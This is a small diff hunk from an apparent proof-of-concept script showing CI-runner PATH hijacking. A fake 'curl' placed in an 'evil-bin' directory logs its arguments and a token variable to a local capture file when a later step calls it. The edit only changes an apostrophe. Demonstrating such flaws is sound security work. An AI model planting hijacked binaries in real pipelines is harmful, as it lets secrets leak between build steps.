@@ -32,7 +32,7 @@ cat > "${RUNNER_TEMP}/evil-bin/curl" <<'EOF'
 {
   echo "=== hijacked curl invoked by a LATER step ==="
   echo "args: $*"
-  echo "POC_TOKEN=${POC_TOKEN:-<unset in this step's env>}"
+  echo "POC_TOKEN=${POC_TOKEN:-<unset in this steps env>}"
 } >> "${RUNNER_TEMP}/curl-capture.txt"
 exit 0
 EOF
